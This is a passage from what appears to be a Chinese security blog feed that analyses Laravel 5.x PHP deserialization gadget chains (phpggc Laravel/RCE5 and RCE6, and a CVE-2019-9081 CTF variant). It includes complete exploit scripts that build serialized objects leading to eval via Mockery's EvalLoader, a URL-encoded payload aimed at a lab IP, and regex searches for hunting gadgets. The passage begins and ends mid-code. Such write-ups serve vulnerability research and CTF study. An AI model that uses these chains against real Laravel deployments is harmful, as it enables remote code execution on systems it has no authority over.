class="line">            <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&lt;?php phpinfo(); exit; ?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&lt;?php phpinfo(); exit; ?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">res</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$res</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码中一定得有 exit ，不然会异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A13%3A%22queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A38%3A%22Illuminate%5CBroadcasting%5CBroadcastEvent%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A1%3A%22a%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A25%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%3B+%3F%3E%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我是从exp推回去，再从后边又去推exp，可能看着比较乱，请见谅</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
            <tag> phpggc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel/RCE6 反序列化</title>
      <link href="2021/04/21/laravel-RCE6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2021/04/21/laravel-RCE6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>最近一直在搞 laravel 的反序列化链，吸收前辈的知识，这必然要来分析一下 phpggc 里面的链，搭起来的环境是 laravel 5.7 的，试了下，把可以影响的几条链都分析一下。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>还是使用之前的入口，其他的没有改变，这里只做分析，不去考虑影响的范围，这是 phpggc 输出的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name           : Laravel/RCE6</span><br><span class="line">Version        : 5.5.*</span><br><span class="line">Type           : RCE (PHP code)</span><br><span class="line">Vector         : __destruct</span><br><span class="line">Informations   : </span><br><span class="line">Executes given PHP code through <span class="built_in">eval</span>().</span><br><span class="line">Requires Mockery, <span class="built_in">which</span> is <span class="keyword">in</span> the require-dev package.</span><br><span class="line"></span><br><span class="line">./phpggc Laravel/RCE6 &lt;code&gt;</span><br></pre></td></tr></table></figure><p>这里写的 5.5.* ，但实际上影响范围也不止这个</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>相对于 RCE5 来说，RCE6 只是多了一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Support\MessageBag</span><br></pre></td></tr></table></figure><p>核心的代码执行的地方没有变，这个加的地方我也是没有看懂，希望有懂了的师傅能帮忙告诉一下</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = [<span class="keyword">new</span> \Mockery\Loader\EvalLoader(), <span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent(<span class="variable">$evilCode</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition(<span class="variable">$evilCode</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Support</span> &#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">MessageBag</span> &#123;</span><br><span class="line">                <span class="title">protected</span> $<span class="title">messages</span> = [];</span><br><span class="line">                <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$inner</span></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;format = <span class="variable">$inner</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="variable">$evilCode</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $code = &#x27;&lt;?php phpinfo();exit;?&gt;&#x27;;</span><br><span class="line">    <span class="variable">$expected</span> = <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$code</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">new</span> \Illuminate\Support\MessageBag(<span class="variable">$expected</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$res</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码中一定得有 exit ，不然会异常</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
            <tag> phpggc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7 反序列化 RCE复现2 注释run版</title>
      <link href="2021/04/19/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B02%20%E6%B3%A8%E9%87%8Arun%E7%89%88/"/>
      <url>2021/04/19/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B02%20%E6%B3%A8%E9%87%8Arun%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>本篇文章是继续上一篇文章，这也是之前某ctf里边出现过的题目，在 CVE-2019-9081 的基础上，删除了 run 入口</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境还是使用之前的，只是注释掉 __construct 中的 run()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## $this-&gt;run();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>很明显，使用之前的 payload 肯定是不行了，我们就要寻找反序列化可以调用 run 的类，很难找到一个可以使用的 <code>__destruct</code> 中使用 call_user_func 的，因此，我们可以考虑使用 call，使用正则搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call\((.|\s)*call_user_func</span><br></pre></td></tr></table></figure><p>找到如下一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, <span class="variable">$name</span>), <span class="variable">$arguments</span>);</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &gt; <span class="keyword">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">OverflowException</span>(sprintf(<span class="string">&#x27;Maximum retries of %d reached without finding a valid value&#x27;</span>, <span class="keyword">$this</span>-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, <span class="variable">$res</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以控制 <code>$this-&gt;generator</code> ，然后再找一个 <code>__destruct</code> ，存在调用的就可以，正则搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct\(</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反序列化，我们可以让 <code>$this-&gt;events</code> 为 存在 <code>__call</code> 的类，在这里也就是 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Faker\ValidGenerator</span><br></pre></td></tr></table></figure><p><code>$this-&gt;event</code> 可以随意写</p><p>这个类没有 dispatch 函数，就会调用 <code>__call</code> ，这里发现，大多数 call 都会使用 <code>call_user_func(\_array)</code>，但参数name 是固定的，是被call的那个函数，一般是无法执行自己想要的函数的，这里我看了其他师傅的文章才弄明白，执行命令的关键点不是在这里，而是在下一个  call_user_func ，这里参考了 <a href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">2020第五空间题解</a></p><p>但那篇文章中使用到的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator</span><br></pre></td></tr></table></figure><p>这个类存在 <code>__wakeup</code> ，不允许反序列化，可能题目环境里边是可以用的？至少我这里是没有办法使用的，所以我用了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\PendingBroadcast</span><br></pre></td></tr></table></figure><p>进入 <code>Faker\ValidGenerator</code> 的 <code>__call</code> ，由于存在这一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure><p>我们要保证不抛出异常，而 <code>$name</code> 这时候是 dispatch，那我们就找一个存在 dispatch 函数的类赋值给 generator ，这里有很多个，我找了这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Events</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合上一篇文章的分析，就可以写出exp</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Events</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$validator</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$validator</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Illuminate\Events\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = <span class="variable">$validator</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span 